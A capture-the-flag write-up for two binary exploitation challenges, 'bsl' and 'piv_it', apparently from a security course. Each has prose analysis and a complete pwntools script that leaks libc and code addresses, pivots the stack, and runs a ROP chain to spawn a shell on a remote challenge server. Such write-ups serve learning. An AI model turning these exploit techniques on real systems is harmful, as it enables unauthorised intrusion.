bsl
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyOC1ic2wiLCJpcCI6IjEyMy4yNDMuMS4xOTIiLCJzZXNzaW9uIjoiNDJlYTIxOTItZjBiNC00MjAxLTlmNjAtODk2OWU5ZjA5ZTIxIn0.U3k0J9qlE5rHCBanYf3-JnUSjjzb0NCnVud9iUWfcCM}

General overview of problems faced
-------------------------------------
# I began this challenge by using binary ninja to fully understand how this program
# is structured. Doing this allowed me to first realise the program displays both a
# code region leak and a libc region leak in different stages of execution. Given this 
# libc leak, we want to find the libc base. To do so, we note in binary ninja that 
# this leak is the address of the puts function, so we use the command:
# readelf -s /lib/i386-linux-gnu/libc-2.27.so | grep ' puts' 
# to find the offset for our local version of libc. For the code region leak, we can
# use vmmap and subtract the base shown there from our leak to get the offset '0x713'.

# Next, we also notice that given the correct input we can gain access to two seperate 
# input buffers. The first buffer is accessed if we enter '0' as our favourite number, 
# and the second is accessed if we enter '1' as our least favourite number.

# In this second buffer, we can see in binary ninja it uses fgets to read in at most
# 207 bytes. If we overflow this buffer, the program seg faults. By using the gdb
# command 'x $ebp' before and after this call to fgets, we can see this occurs because 
# we are overwriting the last byte of the ebp register, changing it from '0xff83cae8' 
# to '0xff83ca00'. Hence, we have a stack pivot by overwriting the ebp, and if we can
# somehow place our own input at this address, we could put something like a ROP chain
# here and it will be executed.

# If we look back at the first buffer, in binary ninja we can see it uses fgets to
# read in at most 0x538 (1336) bytes. Hence if our input ends with newline and EOF, 
# we can input 1336 - 1 - 1 = 1334 bytes. So, we send if we send this many 'A' 
# characters as input, we can see after the ebp register is overwritten, it contains
# the value 0x41414141 (which corresponds to our buffer).

# So, rather than placing a bunch of 'A' characters, we instead want to place a ROP
# chain. However, since we don't know exactly where in the buffer we will land, we
# place a ret sled before our payload. If we begin by simply filling the buffer
# entirely with ret sleds, this would be 1334 / 4 = 333 ret sleds. However, attaching
# our script to gdb and running shows the error 'Invalid address 0xa6566184'. Since
# the address of the ret gadget we are using is 0x566184a6, we simply need to offset
# our ret slide by a single byte.

# Now our ret sled is correctly aligned, we simply need to place our ROP chain at the
# end of our input. By doing displaying len(payload), we can see it 72 bytes long.
# Hence, we need to remove the last 72 / 4 = 18 ret gadgets from our input, which is
# 333 - 18 = 315 ret gadgets followed by our ROP chain.

# Given this works locally, I now need to determine the libc version used remotely. To
# do so, we note in binary ninja that the libc leak we have is for the puts function.
# If we run our script on the remote server, our leak is '0xf7624b40'. Given this,
# we can use a libc database ('libc.nullbyte.cat') to determine the potential libc
# version. There are only two potential matches, so we first try the one without any
# extra stuff 'libc6_2.27-3ubuntu1_i386'. If we click on this, it gives us the offset
# of puts as '0x067b40', so we can update our libc base for remote execution. Since
# the piv_it challenge also used this same libc version, we can simply copy across the
# ROP chain used in that challenge, with our script now popping a shell as required.

Script/Command used
------------------
```
PROGNAME = "challenges/./bsl"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 8001

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

# By responding 'y' to the first question, we can extract a libc leak.
p.sendline(b"y")
p.recvuntil("is: ")
libc_leak = int(p.recvline()[:-1], 0)
log.info("libc leak is: {}".format(hex(libc_leak)))

# Since my local machine and the remote server use different libc versions, the offset
# for puts is different for each.
if args.REMOTE:
    puts_offset = 0x067b40
else:
    puts_offset = 0x67c10

# We can now calculate the libc base using this offset.
libc_base = libc_leak - puts_offset
log.info("libc base is: {}".format(hex(libc_base)))

# Since we don't yet have the code region leak, we respond 'n' to this question.
p.sendline(b"n")

# By responding 'y' to this question, we can extract a code region leak.
p.sendline(b"y")
p.recvuntil("is: ")
code_leak = int(p.recvline()[:-1], 0)
log.info("code leak is: {}".format(hex(code_leak)))

# Using the calculated offset, we can determine the code region base address.
code_base = code_leak - 0x713
log.info("code base is: {}".format(hex(code_base)))

# By entering 0 as our favourite number, the program loops and we can start placing
# our input into the buffers.
p.sendline(b"0")
p.sendline(b"A")

# If we respond 'y' to this question, and give 0 as our favourite number, this gives
# us an input bufffer in which we will place our ROP chain.
p.sendline(b"y")
p.sendline(b"0")

# Using ropper, we can find a binary gadget that is simply 'ret;', which we will use
# to construct our ret sled.
retSlide = code_base + 0x000004a6

# Once again, since different versions of libc are used locally and remotely, the libc
# offsets for these gadgets differ.
if args.REMOTE:
    xor_eax = p32(libc_base + 0x0002e485)
    inc_eax = p32(libc_base + 0x00008aac)
    pop_ebx = p32(libc_base + 0x00018be5)
    bin_sh = p32(libc_base + 0x0017e0cf)
    pop_ecx_edx = p32(libc_base + 0x0002d54c)
    int_80 = p32(libc_base + 0x00002d37)
else:
    xor_eax = p32(libc_base + 0x0002e4d5)
    inc_eax = p32(libc_base + 0x00024b68)
    pop_ebx = p32(libc_base + 0x00018bf5)
    bin_sh = p32(libc_base + 0x0017e3cf)
    pop_ecx_edx = p32(libc_base + 0x0002d59c)
    int_80 = p32(libc_base + 0x00002d37)

# Once we have the addresses for all our gadgets, we can construct a ROP chain to
# pop a shell.
payload = (
    xor_eax + # xor eax, eax; ret;
    inc_eax * 11 + # inc eax; ret;
    pop_ebx + # pop ebx; ret;
    bin_sh +
    pop_ecx_edx + # pop ecx; pop edx; ret;
    p32(0) +
    p32(0) +
    int_80 # int 0x80;
)

# In this input buffer, we send a single character to align our input, followed by a
# ret sled and finally our libc ROP chain.
p.sendline(b"A" + p32(retSlide)*315 + payload)

# If we respond 'y' to this question, and give '1' as our least favourite number, we
# get another input buffer and the program exits afterwards.
p.sendline(b"y")
p.sendline(b"1")

# For this input buffer, we send 207 'A' characters to overflow the last byte of the
# ebp register.
p.sendline(b"A"*207)

# Now that we have a shell, we can access the flag.
p.interactive()
```
``

piv_it
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyOC1waXZfaXQiLCJpcCI6IjEyMy4yNDMuMS4xOTIiLCJzZXNzaW9uIjoiOTY5YzY4MWYtOTQ2Mi00NGI3LWFhMWUtOTY5OWViNjVlODE4In0.Sp5lZfLH22n5cIFQyOzx8vP3g1bS0VEeuUUdUrCdvyo}

General overview of problems faced
-------------------------------------
# Based on the name of the challenge, I assumed I would have to use stack pivoting.
# I first discovered that if I overwrote the second buffer it seg faults. Hence, this
# suggests we can overwrite the return address of the second buffer to jump to the
# first buffer, in which we could place a ROP chain.

# If we overwrite the second buffer with a cyclic sequence, it attempts to return to
# address 0x61616169, which is at an offset of 32 in the sequence. So, we want to place
# a stack pivot gadget at offset 32 in the second buffer. Since PIE is enabled, the
# addresses of gadgets in the binary will change each time, so we need a code region
# leak.

# Luckily, the program leaks a code region address. Using this leak, we can find the
# base address by using vmmap and subtracting the base shown there from our leak to
# get the offset 0x713.

# Now to get a pivot gadget, we can use the command 'ropper -f piv_it --stack-pivot',
# which will display any gadgets that modify the esp register. To test which gadget
# will successfully jump us to our first buffer, I filled the first buffer with 'A'
# characters. If we connect our script to gdb right before we send a pivot gadget,
# we can see esp is at 0xff831e00. Using the command 'stack 500' in gdb, we can then
# see our buffer (made recognisable by a bunch of 'A' characters) is at 0xff832088.
# Hence, we need to add 0xff832088 - 0xff831e00 = 0x288 to esp to reach our buffer.

# After trying several pivot gadgets which either didn't reach the buffer, or went
# past the buffer, I found the following gadget:
# pivot 0x00000687 ('add esp, 0xec; add esp, 0x19c; ret;')
# Since 0xec + 0x19c = 0x288, this is the exact offset we need to get esp to the start 
# of our buffer. To confirm this, if we enter this gadget as input into the second
# buffer, it attempts to execute 0x41414141 (or 'AAAA'), which is the contents of our
# buffer.

# Now, instead of filling our first buffer with 'A' characters, we can instead place 
# a ROP chain using libc gadgets to pop a shell. To do this locally, we note the
# program leaks a libc address, so we can use vmmap and subtract the libc base shown 
# there from our leak to get the offset 0x513a0. Given the libc base, we are free to
# use any libc gadgets to construct our ROP chain and place this in our first buffer.

# At this point, if I run my script locally it pops a shell as required. However,
# remotely this fails to work. So, I need to determine the version of libc being used
# on this remote server. To do so, I know through looking in binary ninja that the
# libc address leaked is for the function printf. Also, if we access the binary 
# remotely, our libc leak is now the address '0xf759c2d0'.

# Given a function and its leaked libc address, we can use a libc database (such as
# 'libc.nullbyte.cat'), and enter 'printf' as the function and '0xf759c2d0' as the
# address. When doing so, we are given multiple matches. Since all other libc versions
# had extra prefixes or suffixes, I decided to test 'libc6_2.27-3ubuntu1_i386' first.
# If we click this, it displays the printf offset as '0x0512d0', so we can subtract
# this from our libc leak to get the libc base.

# Now, it also gives us the option to download this libc version. After doing so, we
# can use ropper on this file to get the offsets for our ROP chain gadgets, and can
# update our payload accordingly. If we now try run the script remotely, our ROP 
# chain executes successfully and pops a shell.

Script/Command used
------------------
```
PROGNAME = "challenges/./piv_it"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 8002

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

# Extracting the libc leak.
p.recvuntil("At: ")
libc_leak = int(p.recvline()[:-1], 0)
log.info("libc leak is: {}".format(hex(libc_leak)))

# Since my local machine and the remote server use different libc versions, the offset
# for printf is different for each.
if args.REMOTE:
    printf_offset = 0x0512d0
else:
    printf_offset = 0x513a0

# Given this libc leak and the libc offset for printf, we can now calculate the libc
# base.
libc_base = libc_leak - printf_offset
log.info("libc base is: {}".format(hex(libc_base)))

# Once again, since different versions of libc are used locally and remotely, the libc
# offsets for these gadgets differ.
if args.REMOTE:
    xor_eax = p32(libc_base + 0x0002e485)
    inc_eax = p32(libc_base + 0x00008aac)
    pop_ebx = p32(libc_base + 0x00018be5)
    bin_sh = p32(libc_base + 0x0017e0cf)
    pop_ecx_edx = p32(libc_base + 0x0002d54c)
    int_80 = p32(libc_base + 0x00002d37)
else:
    xor_eax = p32(libc_base + 0x0002e4d5)
    inc_eax = p32(libc_base + 0x00024b68)
    pop_ebx = p32(libc_base + 0x00018bf5)
    bin_sh = p32(libc_base + 0x0017e3cf)
    pop_ecx_edx = p32(libc_base + 0x0002d59c)
    int_80 = p32(libc_base + 0x00002d37)

# Once we have the addresses for all our gadgets, we can construct a ROP chain to
# pop a shell.
payload = (
    xor_eax + # xor eax, eax; ret;
    inc_eax * 11 + # inc eax; ret;
    pop_ebx + # pop ebx; ret;
    bin_sh +
    pop_ecx_edx + # pop ecx; pop edx; ret;
    p32(0) +
    p32(0) +
    int_80 # int 0x80;
)

# We then input our ROP chain into the first buffer.
p.sendline(payload)

# Extracting the code region leak.
p.recvuntil("At: ")
code_leak = int(p.recvline()[:-1], 0)
log.info("code leak is: {}".format(hex(code_leak)))

# We subtract our calculated offset from the leak to get the code region base address.
code_base = code_leak - 0x725
log.info("code base is: {}".format(hex(code_base)))

# Next, we add our pivot gadget's offset to the code base.
pivot = p32(code_base + 0x00000687)

# Finally we overwrite the return address with our pivot gadget, which will set the
# esp to point to our first buffer containing a ROP chain.
p.sendline(flat({
 32: pivot # add esp, 0xec; add esp, 0x19c; ret;
}))

# Now we have shell access, we can get the flag.
p.interactive()
```
``